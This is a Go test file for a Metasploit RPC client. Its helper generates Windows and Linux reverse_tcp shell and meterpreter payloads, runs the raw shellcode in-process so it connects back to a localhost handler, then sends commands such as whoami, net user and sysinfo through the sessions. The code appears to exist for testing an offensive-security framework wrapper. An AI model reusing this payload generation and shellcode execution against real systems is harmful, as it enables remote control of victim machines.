package msfrpc

import (
	"context"
	"io"
	"os"
	"runtime"
	"strconv"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"project/internal/logger"
	"project/internal/module/shellcode"
	"project/internal/patch/monkey"
	"project/internal/testsuite"
)

func testCreateShellSession(t *testing.T, msfrpc *MSFRPC, port string) uint64 {
	return testCreateSession(t, msfrpc, "shell", port)
}

func testCreateMeterpreterSession(t *testing.T, msfrpc *MSFRPC, port string) uint64 {
	return testCreateSession(t, msfrpc, "meterpreter", port)
}

func testCreateSession(t *testing.T, msfrpc *MSFRPC, typ, port string) uint64 {
	ctx := context.Background()

	// select payload
	opts := make(map[string]interface{})
	switch runtime.GOOS {
	case "windows":
		switch runtime.GOARCH {
		case "386":
			opts["PAYLOAD"] = "windows/" + typ + "/reverse_tcp"
		case "amd64":
			opts["PAYLOAD"] = "windows/x64/" + typ + "/reverse_tcp"
		default:
			t.Skip("only support 386 and amd64")
		}
	case "linux":
		switch runtime.GOARCH {
		case "386":
			opts["PAYLOAD"] = "linux/" + typ + "/reverse_tcp"
		case "amd64":
			opts["PAYLOAD"] = "linux/x64/" + typ + "/reverse_tcp"
		default:
			t.Skip("only support 386 and amd64")
		}
	default:
		t.Skip("only support windows and linux")
	}
	// handler
	opts["TARGET"] = 0
	opts["ExitOnSession"] = false
	// payload
	opts["LHOST"] = "127.0.0.1"
	opts["LPORT"] = port
	opts["EXITFUNC"] = "thread"

	// start handler
	mResult, err := msfrpc.ModuleExecute(ctx, "exploit", "multi/handler", opts)
	require.NoError(t, err)
	defer func() {
		jobID := strconv.FormatUint(mResult.JobID, 10)
		err = msfrpc.JobStop(ctx, jobID)
		require.NoError(t, err)
	}()

	// generate payload
	payload := opts["PAYLOAD"].(string)
	payloadOpts := NewModuleExecuteOptions()
	payloadOpts.Format = "raw"
	payloadOpts.DataStore["EXITFUNC"] = "thread"
	payloadOpts.DataStore["LHOST"] = "127.0.0.1"
	payloadOpts.DataStore["LPORT"] = port
	pResult, err := msfrpc.ModuleExecute(ctx, "payload", payload, payloadOpts)
	require.NoError(t, err)
	sc := []byte(pResult.Payload)
	// execute shellcode and wait some time
	go func() { _ = shellcode.Execute("", sc) }()
	time.Sleep(5 * time.Second)

	// check session number
	sessions, err := msfrpc.SessionList(ctx)
	require.NoError(t, err)
	require.Len(t, sessions, 1)
	for id := range sessions {
		return id
	}
	return 0
}

func TestMSFRPC_SessionList(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		testCreateShellSession(t, msfrpc, "55001")

		sessions, err := msfrpc.SessionList(ctx)
		require.NoError(t, err)
		for id, session := range sessions {
			const format = "id: %d type: %s remote: %s\n"
			t.Logf(format, id, session.Type, session.TunnelPeer)

			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		sessions, err := msfrpc.SessionList(ctx)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
		require.Nil(t, sessions)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			sessions, err := msfrpc.SessionList(ctx)
			monkey.IsMonkeyError(t, err)
			require.Nil(t, sessions)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionStop(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateShellSession(t, msfrpc, "55002")

		err = msfrpc.SessionStop(ctx, id)
		require.NoError(t, err)
	})

	t.Run("invalid session id", func(t *testing.T) {
		err = msfrpc.SessionStop(ctx, 999)
		require.EqualError(t, err, "unknown session id: 999")
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		err = msfrpc.SessionStop(ctx, 999)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			err = msfrpc.SessionStop(ctx, 999)
			monkey.IsMonkeyError(t, err)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionRead(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateShellSession(t, msfrpc, "55003")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		result, err := msfrpc.SessionRead(ctx, id, 0)
		require.NoError(t, err)
		t.Log(result.Seq, result.Data)
	})

	t.Run("invalid session id", func(t *testing.T) {
		result, err := msfrpc.SessionRead(ctx, 999, 0)
		require.EqualError(t, err, "unknown session id: 999")
		require.Nil(t, result)
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		result, err := msfrpc.SessionRead(ctx, 999, 0)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
		require.Nil(t, result)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			result, err := msfrpc.SessionRead(ctx, 999, 0)
			monkey.IsMonkeyError(t, err)
			require.Nil(t, result)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionWrite(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateShellSession(t, msfrpc, "55004")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		result, err := msfrpc.SessionRead(ctx, id, 0)
		require.NoError(t, err)
		t.Log(result.Seq, result.Data)

		n, err := msfrpc.SessionWrite(ctx, id, "whoami\n")
		require.NoError(t, err)
		require.Equal(t, uint64(7), n)

		result, err = msfrpc.SessionRead(ctx, id, 0)
		require.NoError(t, err)
		t.Log(result.Seq, result.Data)
	})

	t.Run("no data", func(t *testing.T) {
		n, err := msfrpc.SessionWrite(ctx, 0, "")
		require.NoError(t, err)
		require.Zero(t, n)
	})

	const (
		id   = 999
		data = "cmd"
	)

	t.Run("invalid session id", func(t *testing.T) {
		n, err := msfrpc.SessionWrite(ctx, id, data)
		require.EqualError(t, err, "unknown session id: 999")
		require.Zero(t, n)
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		n, err := msfrpc.SessionWrite(ctx, id, data)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
		require.Zero(t, n)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			n, err := msfrpc.SessionWrite(ctx, id, data)
			monkey.IsMonkeyError(t, err)
			require.Zero(t, n)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionUpgrade(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateShellSession(t, msfrpc, "55005")

		const (
			host = "127.0.0.1"
			port = 55006
		)
		// select payload (not select architecture because the post module).
		opts := make(map[string]interface{})
		switch runtime.GOOS {
		case "windows":
			opts["PAYLOAD"] = "windows/meterpreter/reverse_tcp"
		case "linux":
			opts["PAYLOAD"] = "linux/x86/meterpreter/reverse_tcp"
		default:
			t.Skip("only support windows and linux")
		}
		// handler
		opts["TARGET"] = 0
		opts["ExitOnSession"] = false
		// payload
		opts["LHOST"] = host
		opts["LPORT"] = port
		opts["EXITFUNC"] = "thread"

		// start handler
		result, err := msfrpc.ModuleExecute(ctx, "exploit", "multi/handler", opts)
		require.NoError(t, err)
		defer func() {
			jobID := strconv.FormatUint(result.JobID, 10)
			err = msfrpc.JobStop(ctx, jobID)
			require.NoError(t, err)
		}()

		_, err = msfrpc.SessionUpgrade(ctx, id, host, port, nil, 0)
		require.NoError(t, err)

		time.Sleep(5 * time.Second)

		// list session
		sessions, err := msfrpc.SessionList(ctx)
		require.NoError(t, err)
		for id, session := range sessions {
			const format = "id: %d type: %s remote: %s\n"
			t.Logf(format, id, session.Type, session.TunnelPeer)

			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}
	})

	const (
		host = "127.0.0.1"
		port = 55006
		wait = 0
	)

	t.Run("invalid session id", func(t *testing.T) {
		result, err := msfrpc.SessionUpgrade(ctx, 999, host, port, nil, wait)
		require.EqualError(t, err, "invalid session id: 999")
		require.Nil(t, result)
	})

	id := testCreateShellSession(t, msfrpc, "55006")
	defer func() {
		// kill session(need create a new msfrpc client)
		msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
		require.NoError(t, err)
		err = msfrpc.AuthLogin()
		require.NoError(t, err)

		err = msfrpc.SessionStop(ctx, id)
		require.NoError(t, err)

		msfrpc.Kill()
		testsuite.IsDestroyed(t, msfrpc)
	}()

	t.Run("cancel", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go func() {
			time.Sleep(3 * time.Second)
			cancel()
		}()

		_, err = msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
		require.Error(t, err)
	})

	t.Run("cancel after write", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go func() {
			time.Sleep(7 * time.Second)
			cancel()
		}()

		_, err = msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
		require.Error(t, err)
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		result, err := msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
		require.Nil(t, result)
	})

	t.Run("failed to execute", func(t *testing.T) {
		patch := func(interface{}, context.Context, string, string,
			interface{}) (*ModuleExecuteResult, error) {
			return nil, monkey.ErrMonkey
		}
		pg := monkey.PatchInstanceMethod(msfrpc, "ModuleExecute", patch)
		defer pg.Unpatch()

		result, err := msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
		monkey.IsMonkeyError(t, err)
		require.Nil(t, result)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			result, err := msfrpc.SessionUpgrade(ctx, id, host, port, nil, wait)
			monkey.IsMonkeyError(t, err)
			require.Nil(t, result)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionMeterpreterRead(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateMeterpreterSession(t, msfrpc, "55010")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		data, err := msfrpc.SessionMeterpreterRead(ctx, id)
		require.NoError(t, err)
		t.Log(data)
	})

	t.Run("invalid session id", func(t *testing.T) {
		data, err := msfrpc.SessionMeterpreterRead(ctx, 999)
		require.EqualError(t, err, "unknown session id: 999")
		require.Zero(t, data)
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		data, err := msfrpc.SessionMeterpreterRead(ctx, 999)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
		require.Zero(t, data)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			data, err := msfrpc.SessionMeterpreterRead(ctx, 999)
			monkey.IsMonkeyError(t, err)
			require.Zero(t, data)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionMeterpreterWrite(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateMeterpreterSession(t, msfrpc, "55011")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		err = msfrpc.SessionMeterpreterWrite(ctx, id, "sysinfo")
		require.NoError(t, err)

		time.Sleep(time.Second)

		data, err := msfrpc.SessionMeterpreterRead(ctx, id)
		require.NoError(t, err)
		t.Logf("\n%s\n", data)
	})

	const (
		id   = 999
		data = "sysinfo"
	)

	t.Run("no data", func(t *testing.T) {
		err := msfrpc.SessionMeterpreterWrite(ctx, id, "")
		require.NoError(t, err)
	})

	t.Run("invalid session id", func(t *testing.T) {
		err := msfrpc.SessionMeterpreterWrite(ctx, id, data)
		require.EqualError(t, err, "unknown session id: 999")
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		err := msfrpc.SessionMeterpreterWrite(ctx, id, data)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			err := msfrpc.SessionMeterpreterWrite(ctx, id, data)
			monkey.IsMonkeyError(t, err)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionMeterpreterDetach(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateMeterpreterSession(t, msfrpc, "55012")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		err = msfrpc.SessionMeterpreterDetach(ctx, id)
		require.NoError(t, err)
	})

	const id = 999

	t.Run("invalid session id", func(t *testing.T) {
		err := msfrpc.SessionMeterpreterDetach(ctx, id)
		require.EqualError(t, err, "unknown session id: 999")
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		err := msfrpc.SessionMeterpreterDetach(ctx, id)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			err := msfrpc.SessionMeterpreterDetach(ctx, id)
			monkey.IsMonkeyError(t, err)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionMeterpreterKill(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateMeterpreterSession(t, msfrpc, "55013")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		err = msfrpc.SessionMeterpreterKill(ctx, id)
		require.NoError(t, err)
	})

	const id = 999

	t.Run("invalid session id", func(t *testing.T) {
		err := msfrpc.SessionMeterpreterKill(ctx, id)
		require.EqualError(t, err, "unknown session id: 999")
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		err := msfrpc.SessionMeterpreterKill(ctx, id)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			err := msfrpc.SessionMeterpreterKill(ctx, id)
			monkey.IsMonkeyError(t, err)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionMeterpreterRunSingle(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("success", func(t *testing.T) {
		id := testCreateMeterpreterSession(t, msfrpc, "55014")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		err := msfrpc.SessionMeterpreterRunSingle(ctx, id, "sysinfo")
		require.NoError(t, err)

		time.Sleep(time.Second)

		data, err := msfrpc.SessionMeterpreterRead(ctx, id)
		require.NoError(t, err)
		t.Logf("\n%s\n", data)
	})

	const (
		id   = 999
		data = "sysinfo"
	)

	t.Run("invalid session id", func(t *testing.T) {
		err := msfrpc.SessionMeterpreterRunSingle(ctx, id, data)
		require.EqualError(t, err, "unknown session id: 999")
	})

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		err := msfrpc.SessionMeterpreterRunSingle(ctx, id, data)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			err := msfrpc.SessionMeterpreterRunSingle(ctx, id, data)
			monkey.IsMonkeyError(t, err)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestMSFRPC_SessionCompatibleModules(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	t.Run("shell", func(t *testing.T) {
		id := testCreateShellSession(t, msfrpc, "55015")

		modules, err := msfrpc.SessionCompatibleModules(ctx, id)
		require.NoError(t, err)
		for i := 0; i < len(modules); i++ {
			t.Log(modules[i])
		}

		err = msfrpc.SessionStop(ctx, id)
		require.NoError(t, err)
	})

	t.Run("meterpreter", func(t *testing.T) {
		id := testCreateMeterpreterSession(t, msfrpc, "55016")
		defer func() {
			err = msfrpc.SessionStop(ctx, id)
			require.NoError(t, err)
		}()

		modules, err := msfrpc.SessionCompatibleModules(ctx, id)
		require.NoError(t, err)
		for i := 0; i < len(modules); i++ {
			t.Log(modules[i])
		}
	})

	const id = 999

	t.Run("invalid authentication token", func(t *testing.T) {
		token := msfrpc.GetToken()
		defer msfrpc.SetToken(token)
		msfrpc.SetToken(testInvalidToken)

		modules, err := msfrpc.SessionCompatibleModules(ctx, id)
		require.EqualError(t, err, ErrInvalidTokenFriendly)
		require.Nil(t, modules)
	})

	t.Run("failed to send", func(t *testing.T) {
		testPatchSend(func() {
			modules, err := msfrpc.SessionCompatibleModules(ctx, id)
			monkey.IsMonkeyError(t, err)
			require.Nil(t, modules)
		})
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestShell(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	err = msfrpc.DBConnect(ctx, testDBOptions)
	require.NoError(t, err)

	const interval = 25 * time.Millisecond

	id := testCreateShellSession(t, msfrpc, "55300")
	shell := msfrpc.NewShell(id, interval)

	go func() { _, _ = io.Copy(os.Stdout, shell) }()

	time.Sleep(time.Second)

	var commands []string
	switch runtime.GOOS {
	case "windows":
		commands = []string{
			"whoami\r\n",
			"dir\r\n",
			"net user\r\n",
			"ipconfig\r\n",
		}
	case "linux":
		commands = []string{
			"whoami\r\n",
			"ls\r\n",
			"ifconfig\r\n",
		}
	default:
		t.Skip("only support windows and linux")
	}

	for _, command := range commands {
		_, err = shell.Write([]byte(command))
		require.NoError(t, err)
	}

	time.Sleep(time.Second)

	err = shell.Kill()
	require.NoError(t, err)

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestShell_reader(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	err = msfrpc.DBConnect(ctx, testDBOptions)
	require.NoError(t, err)

	const interval = 25 * time.Millisecond

	id := testCreateShellSession(t, msfrpc, "55301")
	defer func() {
		// kill session(need create a new msfrpc client)
		msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
		require.NoError(t, err)
		err = msfrpc.AuthLogin()
		require.NoError(t, err)

		err = msfrpc.SessionStop(ctx, id)
		require.NoError(t, err)

		msfrpc.Kill()
		testsuite.IsDestroyed(t, msfrpc)
	}()

	t.Run("failed to read", func(t *testing.T) {
		shell := msfrpc.NewShell(id, interval)

		go func() { _, _ = io.Copy(os.Stdout, shell) }()

		time.Sleep(2 * minReadInterval)
		shell.cancel()

		err = shell.Close()
		require.NoError(t, err)
		testsuite.IsDestroyed(t, shell)
	})

	t.Run("panic", func(t *testing.T) {
		_, w := io.Pipe()
		defer func() { _ = w.Close() }()

		patchFunc := func(interface{}) bool {
			panic(monkey.Panic)
		}
		pg := monkey.PatchInstanceMethod(w, "Write", patchFunc)
		defer pg.Unpatch()

		shell := msfrpc.NewShell(id, interval)

		go func() { _, _ = io.Copy(os.Stdout, shell) }()

		time.Sleep(time.Second)

		_, err = shell.Write([]byte("whoami\r\n"))
		require.NoError(t, err)

		time.Sleep(time.Second)

		err = shell.Close()
		require.NoError(t, err)
		testsuite.IsDestroyed(t, shell)
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestShell_writeLimiter(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	err = msfrpc.DBConnect(ctx, testDBOptions)
	require.NoError(t, err)

	const interval = 25 * time.Millisecond

	id := testCreateShellSession(t, msfrpc, "55301")
	defer func() {
		// kill session(need create a new msfrpc client)
		msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
		require.NoError(t, err)
		err = msfrpc.AuthLogin()
		require.NoError(t, err)

		err = msfrpc.SessionStop(ctx, id)
		require.NoError(t, err)

		msfrpc.Kill()
		testsuite.IsDestroyed(t, msfrpc)
	}()

	t.Run("cancel", func(t *testing.T) {
		shell := msfrpc.NewShell(id, interval)

		go func() { _, _ = io.Copy(os.Stdout, shell) }()

		time.Sleep(minReadInterval)

		err = shell.Close()
		require.NoError(t, err)
		testsuite.IsDestroyed(t, shell)
	})

	t.Run("panic", func(t *testing.T) {
		defer func() {
			require.Contains(t, recover(), "close of closed channel")
		}()

		shell := msfrpc.NewShell(id, interval)

		go func() { _, _ = io.Copy(os.Stdout, shell) }()

		time.Sleep(time.Second)

		close(shell.token)

		err = shell.Close()
		require.NoError(t, err)
		testsuite.IsDestroyed(t, shell)
	})

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestShell_Write(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	err = msfrpc.DBConnect(ctx, testDBOptions)
	require.NoError(t, err)

	const interval = 25 * time.Millisecond

	id := testCreateShellSession(t, msfrpc, "55301")
	defer func() {
		// kill session(need create a new msfrpc client)
		msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
		require.NoError(t, err)
		err = msfrpc.AuthLogin()
		require.NoError(t, err)

		err = msfrpc.SessionStop(ctx, id)
		require.NoError(t, err)

		msfrpc.Kill()
		testsuite.IsDestroyed(t, msfrpc)
	}()

	shell := msfrpc.NewShell(id, interval)

	go func() { _, _ = io.Copy(os.Stdout, shell) }()

	go func() {
		time.Sleep(minReadInterval)
		err := shell.Close()
		require.NoError(t, err)
	}()

	_, err = shell.Write([]byte("whoami"))
	require.Equal(t, context.Canceled, err)

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}

func TestShell_Kill(t *testing.T) {
	gm := testsuite.MarkGoroutines(t)
	defer gm.Compare()

	msfrpc, err := NewMSFRPC(testAddress, testUsername, testPassword, logger.Common, nil)
	require.NoError(t, err)
	err = msfrpc.AuthLogin()
	require.NoError(t, err)

	ctx := context.Background()

	err = msfrpc.DBConnect(ctx, testDBOptions)
	require.NoError(t, err)

	const interval = 25 * time.Millisecond

	shell := msfrpc.NewShell(999, interval)
	err = shell.Kill()
	require.Error(t, err)
	err = shell.Close()
	require.NoError(t, err)

	msfrpc.Kill()
	testsuite.IsDestroyed(t, msfrpc)
}
